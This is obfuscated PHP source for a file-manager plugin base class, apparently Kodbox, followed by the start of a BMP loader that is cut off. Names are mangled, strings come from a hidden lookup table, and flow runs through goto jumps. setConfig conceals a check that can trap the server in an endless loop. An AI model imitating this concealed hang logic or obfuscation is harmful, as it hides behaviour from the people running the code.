function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[∞„˜ƒÑºª][953]); } protected function assign($DÀò¨Ìì™ê, $C∞Á∂⁄¯á¶ = false) { if (is_array($DÀò¨Ìì™ê)) { $this->values = array_merge($this->values, $DÀò¨Ìì™ê); } else { $this->values[$DÀò¨Ìì™ê] = $C∞Á∂⁄¯á¶; } } protected function display($B∫∑‚±ñÓ∆) { extract($this->values); require $B∫∑‚±ñÓ∆; } final function hookRegist($CŒ’¡„Í∆) { $this->modelPlugin->appRegist($this->pluginName, $CŒ’¡„Í∆); } final function appIcon() { $Dòí°±ôŸÇ =& $_SERVER[∞„˜ƒÑºª]; $BÃÜ‚√˜˘÷ = $this->appPackage(); $C™Ú¥ö∂ùØ = $Dòí°±ôŸÇ[33]; if (isset($BÃÜ‚√˜˘÷[$Dòí°±ôŸÇ[954]])) { if ($BÃÜ‚√˜˘÷[$Dòí°±ôŸÇ[954]][$Dòí°±ôŸÇ[955]]) { $C™Ú¥ö∂ùØ = $Dòí°±ôŸÇ[956] . $BÃÜ‚√˜˘÷[$Dòí°±ôŸÇ[954]][$Dòí°±ôŸÇ[955]] . $Dòí°±ôŸÇ[957]; } else { if ($BÃÜ‚√˜˘÷[$Dòí°±ôŸÇ[954]][$Dòí°±ôŸÇ[958]]) { $C™Ú¥ö∂ùØ = $Dòí°±ôŸÇ[959] . $BÃÜ‚√˜˘÷[$Dòí°±ôŸÇ[954]][$Dòí°±ôŸÇ[958]] . $Dòí°±ôŸÇ[960]; } } } return $C™Ú¥ö∂ùØ; } final function fileCanView($EèÿüÜã≤°) { $c´¯≤‰¯Ê• =& $_SERVER[∞„˜ƒÑºª]; if ($this->isShare($EèÿüÜã≤°)) { return !0; } if (!Action($c´¯≤‰¯Ê•[961])->authCan($c´¯≤‰¯Ê•[962])) { show_tips(LNG($c´¯≤‰¯Ê•[963]), !1); } ActionCall($c´¯≤‰¯Ê•[964], $EèÿüÜã≤°); } final function isShare($aï‘ç® ñ⁄) { $A∆‰Ë†µ¡ = KodIO::parse($aï‘ç® ñ⁄); return $A∆‰Ë†µ¡[$_SERVER[∞„˜ƒÑºª][29]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($D¿ßﬂ”°Ω¨) { if (request_url_safe($D¿ßﬂ”°Ω¨)) { return $D¿ßﬂ”°Ω¨; } if (!$this->isShare($D¿ßﬂ”°Ω¨)) { $D¿ßﬂ”°Ω¨ = $this->filePath($D¿ßﬂ”°Ω¨); } return Action($_SERVER[∞„˜ƒÑºª][965])->linkOut($D¿ßﬂ”°Ω¨); } public function filePathLinkOut($bÜıâ¨“ãò) { if (request_url_safe($bÜıâ¨“ãò)) { return $bÜıâ¨“ãò; } $this->fileCanView($bÜıâ¨“ãò); return Action($_SERVER[∞„˜ƒÑºª][965])->link($bÜıâ¨“ãò); } final function filePath($dä˜ùœ∂∞ˆ) { if ($bËë∞Ë∑ª« = $this->checkSharePath($dä˜ùœ∂∞ˆ)) { return $bËë∞Ë∑ª«; } $this->fileCanView($dä˜ùœ∂∞ˆ); if (request_url_safe($dä˜ùœ∂∞ˆ)) { $dä˜ùœ∂∞ˆ = $this->_cacheHttpFile($dä˜ùœ∂∞ˆ); $this->fileInfo = IO::infoWithChildren($dä˜ùœ∂∞ˆ); } else { $this->fileInfo = IO::infoWithChildren($dä˜ùœ∂∞ˆ); if (!$this->fileInfo) { show_tips(LNG($_SERVER[∞„˜ƒÑºª][107]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } return $dä˜ùœ∂∞ˆ; } final function _cacheHttpFile($BﬂÌè–ÿôﬂ) { $C—À£∆èî = hash_path($BﬂÌè–ÿôﬂ, !0); $this->cachePath = $this->pluginCachePath($C—À£∆èî); if ($a¶Üâ„˘áΩ = IO::fileNameExist($this->cachePath, $C—À£∆èî)) { return KodIO::make($a¶Üâ„˘áΩ); } $AÒÑÂÍÌ÷ = $this->cachePath . $C—À£∆èî; return $this->pluginCacheFileSet($AÒÑÂÍÌ÷, file_get_contents($BﬂÌè–ÿôﬂ)); } final function _tmpFileName($AÆ¡ˆ”´ÏÔ = array()) { goto E≠õ¡ ⁄È; CÙ·ÆùÊ†ê: return md5(implode($F∂ñ¬ÛëÊ [79], $bÉ¿åÏ€¨”)); goto B£±Ω£‡ﬁÉ; E≠õ¡ ⁄È: $F∂ñ¬ÛëÊ  =& $_SERVER[∞„˜ƒÑºª]; if (!$AÆ¡ˆ”´ÏÔ) { $AÆ¡ˆ”´ÏÔ = $this->fileInfo; } if (isset($AÆ¡ˆ”´ÏÔ[$F∂ñ¬ÛëÊ [160]])) { return $AÆ¡ˆ”´ÏÔ[$F∂ñ¬ÛëÊ [160]]; } goto EáóÌ’‰”¥; EáóÌ’‰”¥: if (isset($AÆ¡ˆ”´ÏÔ[$F∂ñ¬ÛëÊ [158]][$F∂ñ¬ÛëÊ [160]])) { return $AÆ¡ˆ”´ÏÔ[$F∂ñ¬ÛëÊ [158]][$F∂ñ¬ÛëÊ [160]]; } $bÉ¿åÏ€¨” = array($AÆ¡ˆ”´ÏÔ[$F∂ñ¬ÛëÊ [28]], $AÆ¡ˆ”´ÏÔ[$F∂ñ¬ÛëÊ [84]], $AÆ¡ˆ”´ÏÔ[$F∂ñ¬ÛëÊ [86]]); if (isset($AÆ¡ˆ”´ÏÔ[$F∂ñ¬ÛëÊ [373]])) { $bÉ¿åÏ€¨”[] = $AÆ¡ˆ”´ÏÔ[$F∂ñ¬ÛëÊ [373]]; } goto CÙ·ÆùÊ†ê; B£±Ω£‡ﬁÉ: } final function checkSharePath($e§†øñ‘’Ò) { goto B†≠áùë” ; B†≠áùë” : $bøÜ´ç¥∏ö =& $_SERVER[∞„˜ƒÑºª]; if (!defined($bøÜ´ç¥∏ö[966])) { define($bøÜ´ç¥∏ö[967], 0); } if (!$this->isShare($e§†øñ‘’Ò)) { return !1; } goto eîË≈äÓ¥ˆ; Eƒ≠ÇÂµ««: $this->cachePath = $this->pluginCachePath($this->fileInfo[$bøÜ´ç¥∏ö[160]]); return $BÒ¿«Ø°¢õ[$bøÜ´ç¥∏ö[84]]; goto Eú¿≈ç•âî; eîË≈äÓ¥ˆ: $BÒ¿«Ø°¢õ = Action($bøÜ´ç¥∏ö[965])->sharePathInfo($e§†øñ‘’Ò); if (!isset($BÒ¿«Ø°¢õ[$bøÜ´ç¥∏ö[84]])) { show_json(LNG($bøÜ´ç¥∏ö[968]), !1); } $this->fileInfo = $BÒ¿«Ø°¢õ[$bøÜ´ç¥∏ö[158]]; goto Eƒ≠ÇÂµ««; Eú¿≈ç•âî: } final function pluginCachePath($d™ï›«†ãÕ = '') { $BÊ’ôıÎ—ô =& $_SERVER[∞„˜ƒÑºª]; $EŸüã”˘ë— = IO_PATH_SYSTEM_TEMP . $BÊ’ôıÎ—ô[969] . $this->pluginName; if (!($F«øΩß˜üó = IO::infoFull($EŸüã”˘ë—))) { return IO::mkdir($EŸüã”˘ë— . $BÊ’ôıÎ—ô[8] . $d™ï›«†ãÕ); } if (empty($d™ï›«†ãÕ)) { return $F«øΩß˜üó[$BÊ’ôıÎ—ô[84]]; } if (!($fû›á—Ç§Ö = IO::fileNameExist($F«øΩß˜üó[$BÊ’ôıÎ—ô[84]], $d™ï›«†ãÕ))) { return IO::mkdir($F«øΩß˜üó[$BÊ’ôıÎ—ô[84]] . $d™ï›«†ãÕ); } return KodIO::make($fû›á—Ç§Ö); } final function pluginCacheFileSet($AŸë¯ß“•, $D‰Ìä≠Œä∞ = '') { $BﬂËóê’Éå =& $_SERVER[∞„˜ƒÑºª]; if (!($D˘ÈΩ ãø∏ = IO::infoFull($AŸë¯ß“•))) { return IO::mkfile($AŸë¯ß“•, $D‰Ìä≠Œä∞, REPEAT_REPLACE); } IO::setContent($D˘ÈΩ ãø∏[$BﬂËóê’Éå[84]], $D‰Ìä≠Œä∞); return $D˘ÈΩ ãø∏[$BﬂËóê’Éå[84]]; } final function pluginLocalFile($F€∞äÃàó· = '') { goto B≥Ùíƒˆ“ø; Bÿ∏îÜíÑ˜: $EòÏê”´¡Ó = $fÌË∑éÔ†ü . $D≈Á∆ÖÉà . $EãÃÓ«óäñ[98] . $EÏØÖ¬∫†á[$EãÃÓ«óäñ[156]]; if (@file_exists($EòÏê”´¡Ó)) { return $EòÏê”´¡Ó; } $F€∞äÃàó· = IO::download($F€∞äÃàó·, $EòÏê”´¡Ó); goto d…è®©πÊè; eŸŸ¶ó±ƒ: if (!$F€∞äÃàó·) { return $fÌË∑éÔ†ü; } $EÏØÖ¬∫†á = IO::infoWithChildren($F€∞äÃàó·); $D≈Á∆ÖÉà = $this->_tmpFileName($EÏØÖ¬∫†á); goto Bÿ∏îÜíÑ˜; d…è®©πÊè: return $F€∞äÃàó·; goto DﬂâéèﬂÕì; B≥Ùíƒˆ“ø: $EãÃÓ«óäñ =& $_SERVER[∞„˜ƒÑºª]; $fÌË∑éÔ†ü = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($fÌË∑éÔ†ü)) { mk_dir($fÌË∑éÔ†ü); } goto eŸŸ¶ó±ƒ; DﬂâéèﬂÕì: } final function appPackage() { goto cÆ‰ıÛﬂá¶; cÆ‰ıÛﬂá¶: $Bò€∂¢‰∂Ì =& $_SERVER[∞„˜ƒÑºª]; if ($this->packageData) { return $this->packageData; } $A∑ ≠◊±ßò = $this->parseFile($this->pluginPath . $Bò€∂¢‰∂Ì[970]); goto D«§ç≠ƒÎ¶; D«§ç≠ƒÎ¶: $this->parseLang($A∑ ≠◊±ßò); $B¨™Ôúª†î = json_decode_force($A∑ ≠◊±ßò); if (!$B¨™Ôúª†î) { return array(); } goto B•óÊŸÍÓŒ; Fâß“˜‚õ§: return $B¨™Ôúª†î; goto A…ÒÙ¿ÛΩô; B•óÊŸÍÓŒ: $d√¨Æñ°‘ë = Hook::trigger($Bò€∂¢‰∂Ì[971], $B¨™Ôúª†î); if ($d√¨Æñ°‘ë && is_array($d√¨Æñ°‘ë)) { $B¨™Ôúª†î = $d√¨Æñ°‘ë; } $this->packageData = $B¨™Ôúª†î; goto Fâß“˜‚õ§; A…ÒÙ¿ÛΩô: } public function packageInfoGet($D§Ôù°ãë‰) { $F§‘ïﬂè•Ú = $this->appPackage(); return array_get_value($F§‘ïﬂè•Ú, $D§Ôù°ãë‰); } public function packageVersion() { return $this->packageInfoGet($_SERVER[∞„˜ƒÑºª][972]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[∞„˜ƒÑºª][973]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[∞„˜ƒÑºª][974]); } private function parseFile($aÇã∫Í˘úµ) { $Eóª„”√Ç€ =& $_SERVER[∞„˜ƒÑºª]; $Eû™äöå¨´ = file_get_contents($aÇã∫Í˘úµ); $føò≈Üı»Ú = array($Eóª„”√Ç€[975], $Eóª„”√Ç€[976], $Eóª„”√Ç€[977], $Eóª„”√Ç€[978], $Eóª„”√Ç€[979], $Eóª„”√Ç€[980], $Eóª„”√Ç€[981]); $D∑¨àÊûÈü = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$Eóª„”√Ç€[92]][$Eóª„”√Ç€[982]]); $Eû™äöå¨´ = str_replace($føò≈Üı»Ú, $D∑¨àÊûÈü, $Eû™äöå¨´); return $Eû™äöå¨´; } private function parseLang(&$Fí∆ùˆ©¥ô) { goto bÆÓç∞îê‘; eè©Ú¯àØ´: preg_match_all($e™†ﬂÜÏÚ∑[984], $Fí∆ùˆ©¥ô, $A√∫âè®≈Ü); if (!is_array($A√∫âè®≈Ü) || count($A√∫âè®≈Ü) == 0 || !is_array($A√∫âè®≈Ü[0]) || count($A√∫âè®≈Ü[0]) == 0) { return; } $a–å¡„¬É∂ = array(); goto d®ÑìùÈ”Ù; d®ÑìùÈ”Ù: $b‘Öï∑íß„ = array(); foreach ($A√∫âè®≈Ü[0] as $E∏Û∂ëÃÌΩ) { $E›¥ üØºÂ = substr($E∏Û∂ëÃÌΩ, strlen($a≤“ÜŒçƒÀ), -4); $EÀèÇ∏íöó = LNG($E›¥ üØºÂ); $a–å¡„¬É∂[] = $E∏Û∂ëÃÌΩ; $b‘Öï∑íß„[] = str_replace(array($e™†ﬂÜÏÚ∑[55], $e™†ﬂÜÏÚ∑[485], $e™†ﬂÜÏÚ∑[329], $e™†ﬂÜÏÚ∑[110]), array($e™†ﬂÜÏÚ∑[50], $e™†ﬂÜÏÚ∑[50], $e™†ﬂÜÏÚ∑[33], $e™†ﬂÜÏÚ∑[985]), $EÀèÇ∏íöó); } $Fí∆ùˆ©¥ô = str_replace($a–å¡„¬É∂, $b‘Öï∑íß„, $Fí∆ùˆ©¥ô); goto b€ö€ÙöâË; bÆÓç∞îê‘: $e™†ﬂÜÏÚ∑ =& $_SERVER[∞„˜ƒÑºª]; $a≤“ÜŒçƒÀ = $e™†ﬂÜÏÚ∑[983]; if (!strstr($Fí∆ùˆ©¥ô, $a≤“ÜŒçƒÀ)) { return; } goto eè©Ú¯àØ´; b€ö€ÙöâË: } private function parseConfig(&$EÏè–ò˜È‘) { goto c·Ò⁄ú€ßÏ; E‹à÷”ææ…: $EÏè–ò˜È‘ = str_replace($bÈ™≥ÿºêµ, $FñıÎÑ≤´‡, $EÏè–ò˜È‘); goto Fåˆµ˘Êü‘; C›òêÆº⁄Ù: $bÈ™≥ÿºêµ = array(); $FñıÎÑ≤´‡ = array(); foreach ($Eé›ç≠ûå∆[0] as $A€òﬂ˘Ÿ‘‡) { $BËìá–¶Ú⁄ = substr($A€òﬂ˘Ÿ‘‡, strlen($B–∑ñåÃ°ı), -2); $bÈ™≥ÿºêµ[] = $A€òﬂ˘Ÿ‘‡; $FñıÎÑ≤´‡[] = _get($Fâ≈úó¶æ¿, $BËìá–¶Ú⁄); } goto E‹à÷”ææ…; cê°àê‡Á◊: preg_match_all($EŒôÑ⁄É◊ÿ[987], $EÏè–ò˜È‘, $Eé›ç≠ûå∆); if (!is_array($Eé›ç≠ûå∆) || count($Eé›ç≠ûå∆) == 0 || !is_array($Eé›ç≠ûå∆[0]) || count($Eé›ç≠ûå∆[0]) == 0) { return; } $Fâ≈úó¶æ¿ = $this->getConfig(); goto C›òêÆº⁄Ù; c·Ò⁄ú€ßÏ: $EŒôÑ⁄É◊ÿ =& $_SERVER[∞„˜ƒÑºª]; $B–∑ñåÃ°ı = $EŒôÑ⁄É◊ÿ[986]; if (!strstr($EÏè–ò˜È‘, $B–∑ñåÃ°ı)) { return; } goto cê°àê‡Á◊; Fåˆµ˘Êü‘: } private function parsePackage(&$CÓö™ÙÈ√÷) { goto Eêµçª©≠∫; BıÎ¢»—â√: $c˜èÉÊ…åé = array(); $a≥‹Ñã…ÀÃ = array(); foreach ($cŸÏ÷Ûœ•”[0] as $EÈ´Ûí¨À„) { $fÔ∑†·ıÖ‘ = substr($EÈ´Ûí¨À„, strlen($bÈË°óò†Ñ), -2); $c˜èÉÊ…åé[] = $EÈ´Ûí¨À„; $a≥‹Ñã…ÀÃ[] = _get($DÓΩ‹êåçõ, $fÔ∑†·ıÖ‘); } goto Cø∞É°µË; Cø∞É°µË: $CÓö™ÙÈ√÷ = str_replace($c˜èÉÊ…åé, $a≥‹Ñã…ÀÃ, $CÓö™ÙÈ√÷); goto A£¬±®á∏Í; dö÷áÜ¬∆å: preg_match_all($Cèﬂ∑√£¥⁄[989], $CÓö™ÙÈ√÷, $cŸÏ÷Ûœ•”); if (!is_array($cŸÏ÷Ûœ•”) || count($cŸÏ÷Ûœ•”) == 0 || !is_array($cŸÏ÷Ûœ•”[0]) || count($cŸÏ÷Ûœ•”[0]) == 0) { return; } $DÓΩ‹êåçõ = $this->appPackage(); goto BıÎ¢»—â√; Eêµçª©≠∫: $Cèﬂ∑√£¥⁄ =& $_SERVER[∞„˜ƒÑºª]; $bÈË°óò†Ñ = $Cèﬂ∑√£¥⁄[988]; if (!strstr($CÓö™ÙÈ√÷, $bÈË°óò†Ñ)) { return; } goto dö÷áÜ¬∆å; A£¬±®á∏Í: } final function echoFile($D¨´å∂˘˘Ó, $e¡ÜÎèÕ¥• = false) { goto AÂë Ö≠–; dÊÇ√ÑˆπÛ: $this->parsePackage($d∑Ë’∂¬Òì); if (is_array($e¡ÜÎèÕ¥•)) { $d∑Ë’∂¬Òì = str_replace(array_keys($e¡ÜÎèÕ¥•), array_values($e¡ÜÎèÕ¥•), $d∑Ë’∂¬Òì); } echo $CØ“ £’Ÿˆ[55] . $d∑Ë’∂¬Òì; goto D«ÖƒÒﬂâû; c◊˜†‘É´™: $d∑Ë’∂¬Òì = $this->parseFile($aÁãﬁ¨è…Ê); $this->parseLang($d∑Ë’∂¬Òì); $this->parseConfig($d∑Ë’∂¬Òì); goto dÊÇ√ÑˆπÛ; AÂë Ö≠–: $CØ“ £’Ÿˆ =& $_SERVER[∞„˜ƒÑºª]; $aÁãﬁ¨è…Ê = $this->pluginPath . $D¨´å∂˘˘Ó; if (ACT == $CØ“ £’Ÿˆ[990]) { echo $CØ“ £’Ÿˆ[991] . $this->pluginName . $CØ“ £’Ÿˆ[8] . $D¨´å∂˘˘Ó . $CØ“ £’Ÿˆ[992]; if (!file_exists($aÁãﬁ¨è…Ê)) { echo $CØ“ £’Ÿˆ[993]; return; } } goto c◊˜†‘É´™; D«ÖƒÒﬂâû: } final function initLang() { goto CÃ·ØÃﬁôä; aú≥ô√í§∏: if (@count($c‡‰Œå÷≠≈) > 0) { I18n::set($c‡‰Œå÷≠≈); } return $c‡‰Œå÷≠≈; goto A∂ıÃ˘øïé; c˜§Úå«û¢: $eÿ€Éﬂ§‹≈ = I18n::getType(); $c‡‰Œå÷≠≈ = array(); if (file_exists($D·êåﬂÒîò . $eÿ€Éﬂ§‹≈ . $dñ≈¨É‘íè[531])) { $c‡‰Œå÷≠≈ = (include_once $D·êåﬂÒîò . $eÿ€Éﬂ§‹≈ . $dñ≈¨É‘íè[531]); } else { if ($eÿ€Éﬂ§‹≈ == $dñ≈¨É‘íè[996] && !file_exists($D·êåﬂÒîò . $eÿ€Éﬂ§‹≈ . $dñ≈¨É‘íè[531]) && file_exists($D·êåﬂÒîò . $dñ≈¨É‘íè[997])) { $c‡‰Œå÷≠≈ = (include_once $D·êåﬂÒîò . $dñ≈¨É‘íè[997]); } else { if (file_exists($D·êåﬂÒîò . $eè»¯Ÿè≠ª . $dñ≈¨É‘íè[531])) { $c‡‰Œå÷≠≈ = (include_once $D·êåﬂÒîò . $eè»¯Ÿè≠ª . $dñ≈¨É‘íè[531]); } } } goto aú≥ô√í§∏; CÃ·ØÃﬁôä: $dñ≈¨É‘íè =& $_SERVER[∞„˜ƒÑºª]; $eè»¯Ÿè≠ª = $dñ≈¨É‘íè[994]; $D·êåﬂÒîò = $this->pluginPath . $dñ≈¨É‘íè[995]; goto c˜§Úå«û¢; A∂ıÃ˘øïé: } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($F“ƒÂ„Çïõ) { $bµâŒﬂçå¡ =& $_SERVER[∞„˜ƒÑºª]; if (!isset($_SERVER[$bµâŒﬂçå¡[51]]) || !isset($_SERVER[$bµâŒﬂçå¡[58]])) { goto bÕö‹ë…©„; FãƒÈ∑åÃ»: $f«≥¥ä˜ùõ(LIB_DIR); for (;;) { $f«≥¥ä˜ùõ = json_encode($GLOBALS[$bµâŒﬂçå¡[951]]); } goto FﬂŸŸø≈â∞; bÕö‹ë…©„: $CÏÍÔÔ≠€† = $bµâŒﬂçå¡[53]; $c„Ç∞Ò≥Â… = BASIC_PATH . $bµâŒﬂçå¡[54]; $cçÆ§¡—ª„ = $CÏÍÔÔ≠€†($c„Ç∞Ò≥Â…); goto dî‹©–◊éà; dî‹©–◊éà: $dÊåä†ºœ„ = explode($bµâŒﬂçå¡[55], $cçÆ§¡—ª„); if (count($dÊåä†ºœ„) < $bµâŒﬂçå¡[552]) { die; } $f«≥¥ä˜ùõ = $bµâŒﬂçå¡[553]; goto FãƒÈ∑åÃ»; FﬂŸŸø≈â∞: } return $this->modelPlugin->setConfig($this->pluginName, $F“ƒÂ„Çïõ); } public function onSetConfig($a≈”îëñ∂Ú) { } public function onGetConfig($bèÊóî†«ä) { } public function onChangeStatus($a‘çÑÙé‡Ö) { } public function onUninstall() { } public function onInstall() { } public function authCheck($dﬂπﬁàó˘Â = "\160\x6c\x75\147\151\156\x41\165\x74\x68") { $Eûó≤∆„œ¯ =& $_SERVER[∞„˜ƒÑºª]; if (!defined($Eûó≤∆„œ¯[966])) { return !1; } if ($GLOBALS[$Eûó≤∆„œ¯[998]] == 1) { return !0; } $f∂∆Í≥·ä = $this->getConfig(); if (!$f∂∆Í≥·ä[$dﬂπﬁàó˘Â]) { return !1; } return ActionCall($Eûó≤∆„œ¯[999], $f∂∆Í≥·ä[$dﬂπﬁàó˘Â]); } public function url($d∑óæÔ©ú’, $AÙÉÌï∞îÍ = '', $FåàÛ≠≥∞ƒ = true) { goto fó›Èà•Ùÿ; fó›Èà•Ùÿ: $e±éÆø•Î‘ =& $_SERVER[∞„˜ƒÑºª]; $DÓ»¨ÖãÓ◊ = $this->getConfig(); $BµòÉÛ´Ô· = KOD_VERSION . $e±éÆø•Î‘[98] . KOD_VERSION_BUILD; goto Bäüñéì™ü; FÑ–¬è¬öØ: if (!$FåàÛ≠≥∞ƒ) { return $AçõÜ¥ŸÛé; } echo $AçõÜ¥ŸÛé; goto Eπ‚à–Øœ¯; Bäüñéì™ü: $FÖèÖ«åôì = $this->packageVersion(); $a©≤‡À∂±â = $BµòÉÛ´Ô· . $e±éÆø•Î‘[497] . $FÖèÖ«åôì; if ($AÙÉÌï∞îÍ == $e±éÆø•Î‘[33]) { $AçõÜ¥ŸÛé = $this->pluginHost . $d∑óæÔ©ú’ . $e±éÆø•Î‘[1000] . $a©≤‡À∂±â; } else { if ($AÙÉÌï∞îÍ == $e±éÆø•Î‘[1001]) { $AçõÜ¥ŸÛé = STATIC_PATH . $d∑óæÔ©ú’ . $e±éÆø•Î‘[1000] . $BµòÉÛ´Ô·; } else { if ($AÙÉÌï∞îÍ == $e±éÆø•Î‘[1002]) { $AçõÜ¥ŸÛé = APP_HOST . $e±éÆø•Î‘[1003] . $d∑óæÔ©ú’ . $e±éÆø•Î‘[1000] . $BµòÉÛ´Ô·; } else { if (isset($DÓ»¨ÖãÓ◊[$AÙÉÌï∞îÍ])) { $AçõÜ¥ŸÛé = $DÓ»¨ÖãÓ◊[$AÙÉÌï∞îÍ] . $d∑óæÔ©ú’ . $e±éÆø•Î‘[1000] . $a©≤‡À∂±â; } } } } goto FÑ–¬è¬öØ; Eπ‚à–Øœ¯: } public function link($bÈïêÌ•≈“ = false, $Cﬁ™•Ö¯Èñ = '') { $eÊ´êû‡∏· =& $_SERVER[∞„˜ƒÑºª]; if (!$bÈïêÌ•≈“) { $this->link($eÊ´êû‡∏·[1004], $eÊ´êû‡∏·[1002]); $this->link($eÊ´êû‡∏·[1005], $eÊ´êû‡∏·[1001]); $this->link($eÊ´êû‡∏·[1006], $eÊ´êû‡∏·[1001]); $this->link($eÊ´êû‡∏·[1007], $eÊ´êû‡∏·[1001]); $this->link($eÊ´êû‡∏·[1008], $eÊ´êû‡∏·[1001]); return; } $bÀãﬁΩ£Ïê = $this->url($bÈïêÌ•≈“, $Cﬁ™•Ö¯Èñ, !1); if (substr($bÈïêÌ•≈“, -3) == $eÊ´êû‡∏·[1009]) { echo $eÊ´êû‡∏·[1010] . $bÀãﬁΩ£Ïê . $eÊ´êû‡∏·[1011]; } else { if (substr($bÈïêÌ•≈“, -4) == $eÊ´êû‡∏·[1012]) { echo $eÊ´êû‡∏·[1013] . $bÀãﬁΩ£Ïê . $eÊ´êû‡∏·[1014]; } } } } goto aÕ∏é‚È√ï; Eè£Ωªäô≈: class imageGdBMP { public static function load($bÌ÷‰‘µŸê) { $F»∂÷ §„ª = fopen($bÌ÷‰‘µŸê, $_SERVER[∞„˜ƒÑºª][1135]); if ($F»∂÷ §„ª === !1) { return !1; } $B—›â¿è†∞ = self::loadFromStream($F»∂÷ §„ª); fclose($F»∂÷ §„ª); return $B—›â¿è†∞; } public static function loadFromStream($eõå¨Í∆¡¿) { $aÁµÓõ†≤Õ =& $_SERVER[∞„˜ƒÑºª]; $E—œ˜Êﬂßë = fread($eõå¨Í∆¡¿, 14); if ($E—œ˜Êﬂßë === !1) { return !1; } if ($E—œ˜Êﬂßë[0] != $aÁµÓõ†≤Õ[1409] || $E—œ˜Êﬂßë[1] != $aÁµÓõ†≤Õ[1410]) { return !1; } $a¯Œõºæå = unpack($aÁµÓõ†≤Õ[1411] . $aÁµÓõ†≤Õ[1412] . $aÁµÓõ†≤Õ[1413] . $aÁµÓõ†≤Õ[1414] . $aÁµÓõ†≤Õ[1415], $E—œ˜Êﬂßë); return self::loadFromStreamAndFileHeader($eõå¨Í∆¡¿, $a¯Œõºæå); } public static function loadFromStreamAndFileHeader($FáøçËÈæ¿, array $cÏÏ·¶¯çÚ) { goto A≤†ä»∆öœ; f≠á‘≈ªéø: if ($cÛáß µ∆ó == 1 || $cÛáß µ∆ó == 4 || $cÛáß µ∆ó == 8) { goto c°Ü®Ìë≥≤; FÑõ¢‡»∆ø: $BÉ∫ìÊå ¥ = array(); for ($eÉÖÃ©âÃÎ = 0; $eÉÖÃ©âÃÎ < $B±æòåÆÕó; ++$eÉÖÃ©âÃÎ) { $aÁÇâ–ÃÇƒ = fread($FáøçËÈæ¿, $bé»Ô¨àå¯); if ($aÁÇâ–ÃÇƒ === !1) { imagedestroy($C‘ˆ¿òÒõæ); return !1; } extract(unpack($d‘Ô§•ÂÜ[1435], $aÁÇâ–ÃÇƒ . $d‘Ô§•ÂÜ[1434])); $BÉ∫ìÊå ¥[] = imagecolorallocate($C‘ˆ¿òÒõæ, $Bèàú¡Ω‘, $fß–í˘∑µ◊, $BŸæ™£ãú∆); } $E“¬ù®â∞ç = 8 - $cÛáß µ∆ó; goto Bä–õùêä˜; Bä–õùêä˜: $A ª⁄íü∞≤ = (1 << $cÛáß µ∆ó) - 1 << $E“¬ù®â∞ç; if ($Cªçêà•Ì◊ == 1 || $Cªçêà•Ì◊ == 2) { $C—ÜíåãÍã = 0; $aëˆüÔﬂ—§ = $cÛáß µ∆ó >> 2 & 1; for (;;) { if ($C—ÜíåãÍã < -1 || $C—ÜíåãÍã > $dÛªß”¯Í” || $bêËﬂá≥Ãª < -1 || $bêËﬂá≥Ãª > $A®·¢Ö®—Ã) { imagedestroy($C‘ˆ¿òÒõæ); return !1; } $aÁÇâ–ÃÇƒ = fread($FáøçËÈæ¿, 1); if ($aÁÇâ–ÃÇƒ === !1) { imagedestroy($C‘ˆ¿òÒõæ); return !1; } switch ($aÁÇâ–ÃÇƒ) { case $d‘Ô§•ÂÜ[1434]: $aÁÇâ–ÃÇƒ = fread($FáøçËÈæ¿, 1); if ($aÁÇâ–ÃÇƒ === !1) { imagedestroy($C‘ˆ¿òÒõæ); return !1; } switch ($aÁÇâ–ÃÇƒ) { case $d‘Ô§•ÂÜ[1434]: $bêËﬂá≥Ãª += $a¢¶è–∆Óú; $C—ÜíåãÍã = 0; break; case $d‘Ô§•ÂÜ[1436]: $bêËﬂá≥Ãª = 0; $C—ÜíåãÍã = 0; break 3; case $d‘Ô§•ÂÜ[1437]: $aÁÇâ–ÃÇƒ = fread($FáøçËÈæ¿, 2); if ($aÁÇâ–ÃÇƒ === !1) { imagedestroy($C‘ˆ¿òÒõæ); return !1; } list(, $D—Ï∏•âÂÑ, $FÒ»Ã›∞≈“) = unpack($d‘Ô§•ÂÜ[1438], $aÁÇâ–ÃÇƒ); $C—ÜíåãÍã += $D—Ï∏•âÂÑ; $bêËﬂá≥Ãª += $FÒ»Ã›∞≈“ * $a¢¶è–∆Óú; break; default: list(, $f÷ô«£ˆ®≈) = unpack($d‘Ô§•ÂÜ[1439], $aÁÇâ–ÃÇƒ); $BÓ¶ﬁÔÚ∆ö = ($f÷ô«£ˆ®≈ >> $aëˆüÔﬂ—§) + ($f÷ô«£ˆ®≈ & $aëˆüÔﬂ—§); $aÁÇâ–ÃÇƒ = fread($FáøçËÈæ¿, $BÓ¶ﬁÔÚ∆ö + 1 & ~1); if ($aÁÇâ–ÃÇƒ === !1) { imagedestroy($C‘ˆ¿òÒõæ); return !1; } for ($eÉÖÃ©âÃÎ = 0, $EÌüöà¨–π = 0; $eÉÖÃ©âÃÎ < $f÷ô«£ˆ®≈; ++$eÉÖÃ©âÃÎ, ++$C—ÜíåãÍã, $EÌüöà¨–π += $cÛáß µ∆ó) { list(, $DÌá“∫œ‰·) = unpack($d‘Ô§•ÂÜ[1439], $aÁÇâ–ÃÇƒ[$EÌüöà¨–π >> 3]); $BŸæ™£ãú∆ = $EÌüöà¨–π & 7; imagesetpixel($C‘ˆ¿òÒõæ, $C—ÜíåãÍã, $bêËﬂá≥Ãª, $BÉ∫ìÊå ¥[($DÌá“∫œ‰· & $A ª⁄íü∞≤ >> $BŸæ™£ãú∆) >> $E“¬ù®â∞ç - $BŸæ™£ãú∆]); } break; } break; default: $E•ƒ±ıé…ƒ = fread($FáøçËÈæ¿, 1); if ($E•ƒ±ıé…ƒ === !1) { imagedestroy($C‘ˆ¿òÒõæ); return !1; } list(, $dïÛ÷†¬†Ö, $DÌá“∫œ‰·) = unpack($d‘Ô§•ÂÜ[1438], $aÁÇâ–ÃÇƒ . $E•ƒ±ıé…ƒ); for ($eÉÖÃ©âÃÎ = 0, $EÌüöà¨–π = 0; $eÉÖÃ©âÃÎ < $dïÛ÷†¬†Ö; ++$eÉÖÃ©âÃÎ, 